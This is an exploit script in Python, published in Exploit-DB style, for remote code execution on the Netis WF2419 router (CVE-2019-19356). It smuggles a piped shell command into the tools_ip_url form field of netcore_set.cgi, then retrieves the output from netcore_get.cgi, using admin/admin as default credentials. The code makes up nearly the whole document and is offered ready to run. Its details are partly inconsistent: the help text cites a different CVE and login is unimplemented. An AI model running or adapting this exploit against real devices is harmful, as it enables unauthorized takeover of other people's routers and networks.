# Exploit Title: Netis WF2419 2.2.36123 - Remote Code Execution 
# Exploit Author: Elias Issa
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Suppory/downloads/dd/1/img/75
# Date: 2020-02-11
# Version: WF2419 V2.2.36123 => V2.2.36123
# Tested on: NETIS WF2419 V2.2.36123 and V2.2.36123
# CVE : CVE-2019-19356


# Proof of Concept: python netis_rce.py http://192.168.1.1 "ls"

#!/usr/bin/env python
import argparse
import requests
import json

def exploit(host,cmd):
	# Send Payload
	headers_value={'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',  
			'Content-Type': 'application/x-www-form-urlencoded'}
	post_data="mode_name=netcore_set&tools_type=2&tools_ip_url=|+"+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
	vulnerable_page = host + "/cgi-bin-igd/netcore_set.cgi"
	req_payload = requests.post(vulnerable_page, data=post_data, headers=headers_value)
	print('[+] Payload sent')
	try :
		json_data = json.loads(req_payload.text)
		if json_data[0] == "SUCCESS":
			print('[+] Exploit Sucess')
			# Get Command Result
			print('[+] Getting Command Output\n')
			result_page = host + "/cgi-bin-igd/netcore_get.cgi"
			post_data = "mode_name=netcore_get&no=no" 
			req_result = requests.post(result_page, data=post_data, headers=headers_value)
			json_data = json.loads(req_result.text)
			results = json_data["tools_results"]
			print results.replace(';', '\n')
		else:
			print('[-] Exploit Failed')
	except:
  		print("[!] You might need to login.") 

# To be implemented
def login(user, password):
	print('To be implemented')

def main():
    host = args.host
    cmd = args.cmd
    user = args.user
    password = args.password
    #login(user,password)
    exploit(host,cmd)

if __name__ == "__main__":
    ap = argparse.ArgumentParser(
            description="Netis WF2419 Remote Code Execution Exploit (CVE-2019-1337) [TODO]")
    ap.add_argument("host", help="URL (Example: http://192.168.1.1).")
    ap.add_argument("cmd", help="Command to run.")
    ap.add_argument("-u", "--user", help="Admin username (Default: admin).",
            default="admin")
    ap.add_argument("-p", "--password", help="Admin password (Default: admin).",
            default="admin")
    args = ap.parse_args()
    main()